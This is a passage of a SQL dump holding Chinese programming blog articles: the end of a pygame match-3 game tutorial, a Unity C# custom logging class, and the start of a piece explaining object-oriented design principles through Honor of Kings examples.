y+2).type:\n                        return [2, x, y]\n        return [0, x, y]\n    \'\'\'根据坐标获取对应位置的拼图对象\'\'\'\n    def getpacerByPos(self, x, y):\n        return self.all_pacers[x][y]\n    \'\'\'交换拼图\'\'\'\n    def swappacer(self, pacer1_pos, pacer2_pos):\n        margin = pacer1_pos[0] - pacer2_pos[0] + pacer1_pos[1] - pacer2_pos[1]\n        if abs(margin) != 1:\n            return False\n        pacer1 = self.getpacerByPos(*pacer1_pos)\n        pacer2 = self.getpacerByPos(*pacer2_pos)\n        if pacer1_pos[0] - pacer2_pos[0] == 1:\n            pacer1.direction = \'left\'\n            pacer2.direction = \'right\'\n        elif pacer1_pos[0] - pacer2_pos[0] == -1:\n            pacer2.direction = \'left\'\n            pacer1.direction = \'right\'\n        elif pacer1_pos[1] - pacer2_pos[1] == 1:\n            pacer1.direction = \'up\'\n            pacer2.direction = \'down\'\n        elif pacer1_pos[1] - pacer2_pos[1] == -1:\n            pacer2.direction = \'up\'\n            pacer1.direction = \'down\'\n        pacer1.target_x = pacer2.rect.left\n        pacer1.target_y = pacer2.rect.top\n        pacer1.fixed = False\n        pacer2.target_x = pacer1.rect.left\n        pacer2.target_y = pacer1.rect.top\n        pacer2.fixed = False\n        self.all_pacers[pacer2_pos[0]][pacer2_pos[1]] = pacer1\n        self.all_pacers[pacer1_pos[0]][pacer1_pos[1]] = pacer2\n        return True\n    \'\'\'信息显示\'\'\'\n    def __repr__(self):\n        return self.info</code></pre> \n <h3 id=\"5%E3%80%81%E8%B5%84%E6%BA%90%E7%9B%B8%E5%85%B3\">5、资源相关</h3> \n <p>包括游戏背景音频、图片和字体设计</p> \n <blockquote> \n  <p>res主资源目录</p> \n  <p>audios：加载游戏背景音乐</p> \n  <p>fonts：记分牌相关字体</p> \n  <p>imgs：这里存放的是我们的各种小星星的图形，是关键了的哦。如果这个加载不了，</p> \n  <p>我们的消消乐 就没有任何图形了</p> \n </blockquote> \n <p>&nbsp;</p> \n <h3 id=\"6%E3%80%81%E5%90%AF%E5%8A%A8%E4%B8%BB%E7%A8%8B%E5%BA%8F\">6、启动主程序</h3> \n <p><strong>xxls.py</strong></p> \n <p>在主程序中，通过读取配置文件，引入项目资源：包括图片、音频等，并从我们的modules里引入所有我们的模块。</p> \n <pre><code class=\"language-python\">\'\'\'\nFunction:\n    消消乐\n\'\'\'\nimport os\nimport sys\nimport cfg\nimport pygame\nfrom modules import *\n\n\n\'\'\'主程序\'\'\'\ndef main():\n    pygame.init()\n    screen = pygame.display.set_mode(cfg.SCREENSIZE)\n    pygame.display.set_caption(\'hacklex\')\n    # 加载背景音乐\n    pygame.mixer.init()\n    pygame.mixer.music.load(os.path.join(cfg.ROOTDIR, \"res/audios/bg.mp3\"))\n    pygame.mixer.music.set_volume(0.6)\n    pygame.mixer.music.play(-1)\n    # 加载音效\n    sounds = {}\n    sounds[\'mismatch\'] = pygame.mixer.Sound(os.path.join(cfg.ROOTDIR, \'res/audios/badswap.wav\'))\n    sounds[\'match\'] = []\n    for i in range(6):\n        sounds[\'match\'].append(pygame.mixer.Sound(os.path.join(cfg.ROOTDIR, \'res/audios/match%s.wav\' % i)))\n\n    # 字体显示\n    font = pygame.font.Font(os.path.join(cfg.ROOTDIR, \'res/font/font.TTF\'), 25)\n    # 星星\n    pacer_imgs = []\n    for i in range(1, 8):\n        pacer_imgs.append(os.path.join(cfg.ROOTDIR, \'res/imgs/pacer%s.png\' % i))\n    # 循环\n    game = pacerGame(screen, sounds, font, pacer_imgs, cfg)\n    while True:\n        score = game.start()\n        flag = False\n        # 给出选择，玩家选择重玩或者退出\n        while True:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT or (event.type == pygame.KEYUP and event.key == pygame.K_ESCAPE):\n                    pygame.quit()\n                    sys.exit()\n                elif event.type == pygame.KEYUP and event.key == pygame.K_r:\n                    flag = True\n            if flag:\n                break\n            screen.fill((136, 207, 236))\n            text0 = \'Final score: %s\' % score\n            text1 = \'Press &lt;R&gt; to restart the game.\'\n            text2 = \'Press &lt;Esc&gt; to quit the game.\'\n            y = 150\n            for idx, text in enumerate([text0, text1, text2]):\n                text_render = font.render(text, 1, (85, 65, 0))\n                rect = text_render.get_rect()\n                if idx == 0:\n                    rect.left, rect.top = (223, y)\n                elif idx == 1:\n                    rect.left, rect.top = (133.5, y)\n                else:\n                    rect.left, rect.top = (126.5, y)\n                y += 99\n                screen.blit(text_render, rect)\n            pygame.display.update()\n        game.reset()\n\n\n\'\'\'游戏运行\'\'\'\nif __name__ == \'__main__\':\n    main()</code></pre> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <h2 id=\"%E5%9B%9B%E3%80%81%E6%B8%B8%E6%88%8F%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95\">四、如何启动游戏呢？</h2> \n <h3 id=\"1%E3%80%81%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8\">1、使用开发工具IDE启动</h3> \n <p>如果的开发工具IDE的环境</p> \n <p>例如：VScode、sublimeText、notepad+</p> \n <p>pycharm什么的配置了Python环境</p> \n <p>可以直接在工具中，运行该游戏。</p> \n <p>&nbsp;</p> \n <h3 id=\"2%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%20gif\">2、命令行启动</h3> \n <p>如下图所示</p> \n <p><img alt=\"\" height=\"657\" src=\"https://img-blog.csdnimg.cn/20210415154357935.gif\" width=\"724\"></p> \n <h2>推荐阅读</h2> \n <p><strong>python实战</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117260497\">前女友婚礼，python破解婚礼现场的WIFI，把名称改成了</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】前女友发来加密的 “520快乐.pdf“，我用python破解开之后，却发现</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116936268\">【python实战】昨晚，我用python帮隔壁小姐姐P证件照 自拍，然后发现</a>...</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116568510\">【python实战】女友半夜加班发自拍 python男友用30行代码发现惊天秘密</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">【python实战】python你TM太皮了——区区30行代码就能记录键盘的一举一动</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">【</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">python</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">实战】女神相册密码忘记了，我只用Python写了20行代码~~~</a></strong></p> \n <p><strong>pygame系列文章【订阅专栏，获取完整源码】</strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%A1%94%E9%98%B2%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%E5%B0%8F%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/category_7716334.html\">渗透测试实战专栏</a></strong></p> \n <p><strong><a name=\"t15\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959170.html\">Windows AD/Exchange管理专栏</a></strong></p> \n <p><strong><a name=\"t16\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959215.html\">Linux高性能服务器搭建</a>&nbsp;</strong></p> \n <p><strong><a name=\"t17\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10649706.html\">PowerShell自动化专栏</a></strong></p> \n <p>&nbsp;</p> \n <h3>CSDN官方学习推荐 <span style=\"color:#fe2c24;\">↓ ↓ ↓</span></h3> \n <p><strong>CSDN出的Python全栈知识图谱，太强了，推荐给大家！</strong></p> \n <p><img alt=\"\" height=\"552\" src=\"https://img-blog.csdnimg.cn/20210607120133619.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"310\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 1, NULL, NULL, 2);
INSERT INTO `t_article` VALUES (40, 'Unity 自定义日志保存', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h1>前言&nbsp; &nbsp;&nbsp;</h1> \n <p>&nbsp; &nbsp;之前unity5.x在代码中写了debug.log..等等，打包之后在当前程序文件夹下会有个对应的\"outlog.txt\",2017之后这个文件被移到C盘用户Appdata/LocalLow/公司名&nbsp;文件夹下面。觉得不方便就自己写了个</p> \n <h1>代码</h1> \n <pre class=\"has\"><code class=\"language-cs\">using UnityEngine;\nusing System.IO;\nusing System;\nusing System.Diagnostics;\nusing Debug = UnityEngine.Debug;\n\n\npublic class DebugTrace\n{\n    private FileStream fileStream;\n    private StreamWriter streamWriter;\n\n    private bool isEditorCreate = false;//是否在编辑器中也产生日志文件\n    private int showFrames = 1000;  //打印所有\n\n    #region instance\n    private static readonly object obj = new object();\n    private static DebugTrace m_instance;\n    public static DebugTrace Instance\n    {\n        get\n        {\n            if (m_instance == null)\n            {\n                lock (obj)\n                {\n                    if (m_instance == null)\n                        m_instance = new DebugTrace();\n                }\n            }\n            return m_instance;\n        }\n    }\n    #endregion\n\n    private DebugTrace()\n    {\n\n    }\n\n \n\n    /// &lt;summary&gt;\n    /// 开启跟踪日志信息\n    /// &lt;/summary&gt;\n    public void StartTrace()\n    {\n        if (Debug.unityLogger.logEnabled)\n        {\n            if (Application.isEditor)\n            {\n                //在编辑器中设置isEditorCreate==true时候产生日志\n                if (isEditorCreate)\n                {\n                    CreateOutlog();\n                }\n            }\n            //不在编辑器中 是否产生日志由  Debug.unityLogger.logEnabled 控制\n            else\n            {\n                CreateOutlog();\n            }\n        }\n    }\n    private void Application_logMessageReceivedThreaded(string logString, string stackTrace, LogType type)\n    {\n        //  Debug.Log(stackTrace);  //打包后staackTrace为空 所以要自己实现\n        if (type != LogType.Warning)\n        {\n            // StackTrace stack = new StackTrace(1,true); //跳过第二?（1）帧\n            StackTrace stack = new StackTrace(true);  //捕获所有帧\n            string stackStr = string.Empty;\n\n            int frameCount = stack.FrameCount;  //帧数\n            if (this.showFrames &gt; frameCount) this.showFrames = frameCount;  //如果帧数大于总帧速 设置一下\n\n            //自定义输出帧数,可以自行试试查看效果\n            for (int i = stack.FrameCount - this.showFrames; i &lt; stack.FrameCount; i++)\n            {\n                StackFrame sf = stack.GetFrame(i);  //获取当前帧信息\n                                                    // 1:第一种    ps:GetFileLineNumber 在发布打包后获取不到\n                stackStr += \"at [\" + sf.GetMethod().DeclaringType.FullName +\n                            \".\" + sf.GetMethod().Name +\n                            \".Line:\" + sf.GetFileLineNumber() + \"]\\n            \";\n\n                //或者直接调用tostring 显示数据过多 且打包后有些数据获取不到\n                // stackStr += sf.ToString();\n            }\n\n            //或者 stackStr = stack.ToString();\n            string content = string.Format(\"time: {0}   logType: {1}    logString: {2} \\nstackTrace: {3} {4} \",\n                                               DateTime.Now.ToString(\"HH:mm:ss\"), type, logString, stackStr, \"\\r\\n\");\n            streamWriter.WriteLine(content);\n            streamWriter.Flush();\n        }\n    }\n    private void CreateOutlog()\n    {\n        if (!Directory.Exists(Application.dataPath + \"/../\" + \"OutLog\"))\n            Directory.CreateDirectory(Application.dataPath + \"/../\" + \"OutLog\");\n        string path = Application.dataPath + \"/../OutLog\" + \"/\" + DateTime.Now.ToString(\"yyyyMMddHHmmss\") + \"_log.txt\";\n        fileStream = new FileStream(path, FileMode.OpenOrCreate, FileAccess.ReadWrite);\n        streamWriter = new StreamWriter(fileStream);\n        Application.logMessageReceivedThreaded += Application_logMessageReceivedThreaded;\n    }\n\n    /// &lt;summary&gt;\n    /// 关闭跟踪日志信息\n    /// &lt;/summary&gt;\n    public void CloseTrace()\n    {\n        Application.logMessageReceivedThreaded -= Application_logMessageReceivedThreaded;\n        streamWriter.Dispose();\n        streamWriter.Close();\n        fileStream.Dispose();\n        fileStream.Close();\n    }\n    /// &lt;summary&gt;\n    /// 设置选项\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"logEnable\"&gt;是否记录日志&lt;/param&gt;\n    /// &lt;param name=\"showFrams\"&gt;是否显示所有堆栈帧 默认只显示当前帧 如果设为0 则显示所有帧&lt;/param&gt;\n    /// &lt;param name=\"filterLogType\"&gt;过滤 默认log级别以上&lt;/param&gt;\n    /// &lt;param name=\"editorCreate\"&gt;是否在编辑器中产生日志记录 默认不需要&lt;/param&gt;\n    public void SetLogOptions(bool logEnable, int showFrams = 1, LogType filterLogType = LogType.Log, bool editorCreate = false)\n    {\n        Debug.unityLogger.logEnabled = logEnable;\n        Debug.unityLogger.filterLogType = filterLogType;\n        isEditorCreate = editorCreate;\n        this.showFrames = showFrams == 0 ? 1000 : showFrams;\n    }\n\n}\n</code></pre> \n <h1>关于&nbsp;filterLogType</h1> \n <p><strong>filterLogType默认设置是Log，会显示所有类型的Log。</strong></p> \n <p><strong>Warning：会显示Warning,Assert,Error,Exception</strong></p> \n <p><strong>Assert：会显示Assert，Error，Exception</strong></p> \n <p><strong>Error：显示Error和Exception</strong></p> \n <p><strong>Exception：只会显示Exception</strong></p> \n <p>&nbsp;</p> \n <h1>使用</h1> \n <pre class=\"has\"><code class=\"language-cs\">using UnityEngine;\n\npublic class Test : MonoBehaviour\n{\n    private BoxCollider boxCollider;\n    void Start()\n    {\n        DebugTrace.Instance.SetLogOptions(true, 2, editorCreate: true); //设置日志打开 显示2帧 并且编辑器下产生日志\n        DebugTrace.Instance.StartTrace();\n        Debug.Log(\"log\");\n        Debug.Log(\"log\", this);\n        Debug.LogError(\"LogError\");\n        Debug.LogAssertion(\"LogAssertion\");\n      \n        boxCollider.enabled = false;  //报错 发布后捕捉不到帧\n    }\n\n    private void OnApplicationQuit()\n    {\n        DebugTrace.Instance.CloseTrace();\n    }\n}</code></pre> \n <p>如果在编辑器中也设置产生日志，日志文件在当前项目路径下，打包后在exe同级目录下</p> \n <p>在打包发布后某些数据会获取不到 例如行号</p> \n <h1>StackFrame参考</h1> \n <p style=\"text-align:center;\"><img alt=\"\" class=\"has\" height=\"805\" src=\"https://img-blog.csdnimg.cn/20190118163621988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0syMDEzMjAxNA==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p>最后看下效果：</p> \n <p><img alt=\"\" class=\"has\" height=\"371\" src=\"https://img-blog.csdnimg.cn/20190118165557596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0syMDEzMjAxNA==,size_16,color_FFFFFF,t_70\" width=\"1071\"></p> \n <p>&nbsp;</p> \n <h1>不足</h1> \n <p>发布版本 出现异常捕捉不到 行号获取不到</p> \n <p>debug版本可以勾选DevelopMend build 捕捉到更多信息</p> \n <p><img alt=\"\" class=\"has\" height=\"245\" src=\"https://img-blog.csdnimg.cn/20191111172836896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0syMDEzMjAxNA==,size_16,color_FFFFFF,t_70\" width=\"355\"></p> \n</div>', '2021-06-12', '2021-06-16', '默认分类', '', 1, 1, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (41, '零代码以“王者荣耀”为例解析设计七原则，助你面试拿“五杀”', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>零代码以“王者荣耀”为例解析设计七原则，助你面试拿“五杀”</h3> \n  <ul>\n   <li><a href=\"#_2\">前言：</a></li>\n   <li><a href=\"#_8\">一，单一职责原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#11___10\">1.1 举例说明: 惩戒上单</a></li>\n     <li><a href=\"#12___36\">1.2 原则解析: 单一职责</a></li>\n    </ul> </li>\n   <li><a href=\"#_52\">二，开放封闭原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#21___53\">2.1 举例说明: 黄刀由来</a></li>\n     <li><a href=\"#32___64\">3.2 原则解析: 开闭原则</a></li>\n    </ul> </li>\n   <li><a href=\"#_82\">三，里氏代换原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#31___84\">3.1 举例说明: 吸血之镰</a></li>\n     <li><a href=\"#32___97\">3.2 原则解析: 里氏代换</a></li>\n    </ul> </li>\n   <li><a href=\"#_113\">四，迪米特法则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#41___116\">4.1 举例说明: 妲己抓人</a></li>\n     <li><a href=\"#42___135\">4.2 原则解析: 迪米特法则</a></li>\n    </ul> </li>\n   <li><a href=\"#_144\">五，接口分离原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#51__146\">5.1 如何理解接口隔离原则？</a></li>\n     <li><a href=\"#52__154\">5.2 与单一职责原则的区别</a></li>\n    </ul> </li>\n   <li><a href=\"#_165\">六，依赖倒置原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#61___167\">6.1 举例说明: 电脑主板</a></li>\n     <li><a href=\"#62___176\">6.2 原则解析: 依赖倒置</a></li>\n    </ul> </li>\n   <li><a href=\"#_192\">七，合成/聚合复用原则</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#71___196\">7.1 举例说明: 兵线队列</a></li>\n     <li><a href=\"#72___207\">7.2 原则解析: 合成/聚合复用</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <h1><a id=\"_2\"></a>前言：</h1> \n <blockquote> \n  <p>所有举例都是王者荣耀相关内容(不玩王者荣耀的同学，看起来稍费劲)。为了增加阅读兴趣和方便掌握这个七大原则，举例和原则的连接，我已经用尽毕生所学。陆陆续续写了一周还多，不喜勿喷哈~ 有收获的同学，记得点个赞再走…</p> \n </blockquote> \n <p>PS：文中涉及到王者荣耀的相关名字部分使用<font color=\"green\" size=\"3\">绿色3号字</font>标识，所以有了不知道是什么的小伙伴不用追溯，理解为一个装备名，英雄名或者之间理解为类名都是可以的。</p> \n <hr> \n <h1><a id=\"_8\"></a>一，单一职责原则</h1> \n <h2><a id=\"11___10\"></a>1.1 举例说明: 惩戒上单</h2> \n <blockquote> \n  <p>时间：某休息日，地点：王者峡谷，人物：惩戒白起</p> \n </blockquote> \n <p>  版本描述：这个版本双烧流上单玩法很流行，这导致很多肉坦上单英雄都愿意携带<font color=\"green\" size=\"3\">惩戒</font>，然后出<font color=\"green\" size=\"3\">红莲斗篷(日炎)</font>。既能反野加快发育也能提高伤害加成…</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609200647133.png#pic_center\" alt=\"1.1\"></p> \n <p>  情景再现：敌我双方拖至20分钟<font color=\"green\" size=\"3\">风暴龙王</font>现身，可以说实力相当场面十分焦灼。到了抢夺风暴龙王一局定胜负的局面。话说我方双惩戒+<font color=\"green\" size=\"3\">白起</font>长时间团战控制有更大的优势…</p> \n <p>局内对话：</p> \n <ul>\n  <li><strong>打野</strong>：对面要打龙逼团了，我绕后找机会切对面射手法师，你们正面拉扯下，白起尝试抢龙</li>\n  <li><strong>辅助</strong>：白起一会打团你直接入场控制开团，我保双C（我方射手法师）</li>\n  <li><strong>上路白起</strong>：好的，龙马上快到斩杀血线了，大家准备… 我入场了，<strong>龙没抢到</strong></li>\n  <li><strong>射手</strong>：没事没事，你找机会配合打野切对面鲁班，鲁班Si了就能打</li>\n  <li><strong>上路白起</strong>：打野准备切入，鲁班闪现了<strong>我大招距离不够</strong>，打野看你的了，鲁班没闪…</li>\n </ul> \n <p>5S后，对面凭借<font color=\"green\" size=\"3\">风暴龙王Buff</font>和<font color=\"green\" size=\"3\">鲁班</font>输出，团灭我方。带好兵线就可以直接推掉我方水晶，取得胜利。</p> \n <p><font size=\"3\"><strong>赛后复盘：</strong></font></p> \n <ol>\n  <li>虽然白起携带惩戒，但是并没有抢到龙王。</li>\n  <li>也是因为携带惩戒，所以团站也没有控制到对面核心鲁班七号，导致输掉游戏。</li>\n </ol> \n <p>但凡这两点能做到任意一点也不至于输掉游戏。</p> \n <h2><a id=\"12___36\"></a>1.2 原则解析: 单一职责</h2> \n <p>  <strong>其实大多数时候，一个位置的英雄简单一些，职责单一一些， 或许是更好的选择。这就和设计模式中的一大原则 —— 单一职责的道理是一样的。</strong></p> \n <p>  就一个类而言，应该仅有一个引起它变化的原因，我们在写代码的时候，很自然的就会给一个类加各种各样的功能。比如我们写一款游戏，一般定义一个GameManager这样的类，于是我们就把各种各样代码，像处理逻辑算法啊，访问数据库啊什么的都写在这个类中。这就意味着，只要有需求改动，我们都需要修改这个游戏管理器，这其实是很差的写法，维护麻烦，不能复用，也缺少灵活性。</p> \n <p>  我们刚开始学习面向对象的时候，就知道面向对象的好处：<font color=\"red\">可维护、可扩展、可复用、灵活性好。</font> 所以这种写法是需要进行改正的。</p> \n <p>  <font color=\"red\">如果一个类承担的职责过多，就等于吧这些职责耦合在一起，一个职责的变化可能削弱或者抑制这个类完成其他职责的能力。这种耦合会导致脆弱的设计，当变化发生时，设计会遭受到意想不到的破坏。</font></p> \n <ul>\n  <li>单一职责的定义:</li>\n </ul> \n <blockquote> \n  <p><strong>单一职责原则：就一个类而言，应该仅有一个引起它变化的原因。</strong></p> \n </blockquote> \n <hr> \n <h1><a id=\"_52\"></a>二，开放封闭原则</h1> \n <h2><a id=\"21___53\"></a>2.1 举例说明: 黄刀由来</h2> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609200831753.png#pic_center\" alt=\"2.1\"></p> \n <p><font color=\"green\" size=\"3\">黄色打野刀</font>上线也有几个版本了，简单猜测一下它的代码层面是如何实现的。</p> \n <ul>\n  <li>既然是打野刀，那么也就有打野刀的通用属性（可对野怪释放）-- 可以通过继承实现。</li>\n  <li>既然是新装备，那么也就有和其他打野刀不同的属性 – 创建自己的类实现。</li>\n </ul> \n <p>  像这种修改就符合开闭原则。对扩展开启，对修改封闭。这时候你可能在想，我这不是说一堆废话嘛。新添加了一个装备可不要扩展吗，怎么也不会在<font color=\"green\" size=\"3\">红色打野刀</font>类中去写<font color=\"green\" size=\"3\">黄色打野刀</font>的逻辑啊…</p> \n <p>  确实是这样，可是你想过没有，这是在一个成熟的框架下去添加新装备。若这是刚开始开发的程序呢？我们实现的时候不会将所有的二级打野刀都写在一个类中，然后使用属性或者枚举来区分当前使用的打野刀是什么，然后进行相应的逻辑处理…</p> \n <h2><a id=\"32___64\"></a>3.2 原则解析: 开闭原则</h2> \n <p>  因为我们在最初写代码的时候，都假设需求不会产生改变。当需求变化时，我们就创建抽象来隔离以后发生同类的变化。 比如原来王者中只有两种类型的<font color=\"green\" size=\"3\">打野刀</font>：一个是物理伤害，一个是法术伤害的。其他各种属性都一样，那么此时我们写代码的时候完全可能将这两个打野刀写在一个类中。后来又来一个<font color=\"green\" size=\"3\">打野刀</font>，它也是物理伤害的，但是属性从加伤害变成加防御了。</p> \n <p>  那么此时我们就需要考虑未来游戏平衡会不会再添加新的<font color=\"green\" size=\"3\">打野刀</font>，会不会修改现有单一打野刀的属性和数值…这时候我们的原来写的一个类中实现的两个打野刀，就会自然的演变成一个打野刀基类，两个子类继承的形式。进而有了后续添加打野刀时的添加方式。</p> \n <p>  我们在做任何应用的时候，都不要指望一开始时需求确定，就再也不会有修改。既然需求一定会变化，那么如何在面对需求变化时，使得我们的程序可以相对容易的修改，不至于说，新需求一来，我们要删除原来部分代码，重新写一套。这就是开放封闭原则存在的意义。</p> \n <p>  对于开发时呈现出频繁变化的那些部分做出抽象，然而，对于程序中的每个部分都可以的进行抽象同样是一种不好的做法。<strong>拒绝不成型的抽象和抽象本身一样重要。</strong></p> \n <p>  <font color=\"red\"> 开放-封闭原则是面向对象设计的核心所在。遵循这个原 则可以带来面向对象技术所声称的巨大好处，也就是可维护、可扩 展、可复用、灵活性好。</font></p> \n <ul>\n  <li>开闭原则的定义:</li>\n </ul> \n <blockquote> \n  <p><strong>开放-封闭原则：是说软件实体（类，模块，函数等等）应该是可以扩展，但是不可修改。</strong></p> \n </blockquote> \n <hr> \n <h1><a id=\"_82\"></a>三，里氏代换原则</h1> \n <h2><a id=\"31___84\"></a>3.1 举例说明: 吸血之镰</h2> \n <p><font color=\"green\" size=\"3\">吸血之镰</font>俗称小吸血刀，可合成装备如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210609200930709.png#pic_center\" alt=\"3.1\"></p> \n <p>由上图我们可以看到小吸血刀的属性：</p> \n <ul>\n  <li>+10 物理攻击</li>\n  <li>+8% 物理吸血</li>\n </ul> \n <p>  当我们点击它可合成装备时，可以看到三个装备的属性值都是包含 +物理攻击 和 +百分比物理吸血 的。这就是说明，大件装备由小件装备合成，并且继承了小件装备的属性值（多出来的部分时大件私有的）。</p> \n <p>  在游戏中不管你此时购买了<font color=\"green\" size=\"3\">末世,泣血,制裁</font>这三个装备中的哪一个，你都获得了其父类小吸血刀的属性值。在程序的角度讲使用到小吸血刀(父类)的代码完全可以被这三个装备(子类)任意一个去替换，并且不会对游戏逻辑产生影响，这就是里氏代换原则了。</p> \n <h2><a id=\"32___97\"></a>3.2 原则解析: 里氏代换</h2> \n <p><strong>进一步描述:</strong><br>   子类对象能够替换程序中的父类对象出现的任何对象，并且保证原来的程序逻辑行为不变及正确性不被破坏。这么一说有点类似多态，多态是面向对象编程的一大特性，也是面向对象编程语言的一种语法。他是一种代码实现思路。而里氏替换是一种设计原则，是用来指导继承关系中子类该如何设计，子类的设计要保证在替换父类的时候，不改变原有程序逻辑以及不破坏原有程序的正确性。</p> \n <p><strong>回到举例:</strong><br>   若在我们上面的举例中有一个<strong>小吸血刀类中(父类)</strong><code>GetAttribute()</code>方法可以返回当前装备的属性，此时父类返回【 +10物理攻击,+8%物理吸血】；在<strong>大吸血刀类中(子类)</strong><code>GetAttribute()</code>返回【 +100物理攻击,+25%物理吸血】，那么此时这个子类的设计就违背了里氏替换原则。</p> \n <p>  <font color=\"red\">一个软件实体如果使用的是一个父类的话，那么一定适用于其子类，而且察觉不出父类对象和子类对象的区别；也就是说，在程序里面，把父类都替换成它的子类，程序的行为没有变化；简单地说，子类型必须能够替换掉它们的父类型。</font></p> \n <ul>\n  <li>里氏原则的定义:</li>\n </ul> \n <blockquote> \n  <p><strong>里氏代换原则：子类型必须能够替换掉他们的父类型。</strong></p> \n </blockquote> \n <hr> \n <h1><a id=\"_113\"></a>四，迪米特法则</h1> \n <p>又称：最少知道法则</p> \n <h2><a id=\"41___116\"></a>4.1 举例说明: 妲己抓人</h2> \n <blockquote> \n  <p>时间：某休息日，地点：王者峡谷，人物：亚瑟，妲己</p> \n </blockquote> \n <p><font color=\"green\" size=\"3\">妲己</font>在中路清完线，来上路帮助<font color=\"green\" size=\"3\">亚瑟</font>抓人。<br> <img src=\"https://img-blog.csdnimg.cn/20210609201039821.png#pic_center\" alt=\"4.1\"></p> \n <p><font color=\"green\" size=\"3\">妲己</font>一连发起三个快捷消息：</p> \n <ol>\n  <li>发起进攻</li>\n  <li>二技能已经好了</li>\n  <li>大招还有3秒</li>\n </ol> \n <p><font color=\"green\" size=\"3\">亚瑟</font>回复快捷消息：</p> \n <ul>\n  <li>收到</li>\n </ul> \n <p>  3秒后，<font color=\"green\" size=\"3\">妲己</font>走到上路草丛埋伏。<font color=\"green\" size=\"3\">亚瑟</font>卖血假装打不过，撤向妲己所在草丛，妲己一套二三一，配合亚瑟收下对面上路人头。</p> \n <p>  对于<font color=\"green\" size=\"3\">亚瑟</font>来说，他只知道<font color=\"green\" size=\"3\">妲己</font>在准备来上路抓人，技能马上好了，这两个消息，他并不知道妲己技能当前加点等级，也不知道妲己还差多少钱可以出下个装备。这些妲己的 “ <strong>内部实现</strong> \"，亚瑟都不知道，他也不需要知道。这就是迪米特法则。</p> \n <h2><a id=\"42___135\"></a>4.2 原则解析: 迪米特法则</h2> \n <p>  “迪米特法则首先强调的是前提是在类的结构设计上，每一个类都应当尽量降低成员的访问权限；也就是说，一个类包装好自己的private状态，不需要别的类知道的字段或行为就不要公开”</p> \n <p><strong><font color=\"red\"> 迪米特法则其根本思想是强调了类之间的松耦合。</font></strong></p> \n <ul>\n  <li>迪米特法则的定义:</li>\n </ul> \n <blockquote> \n  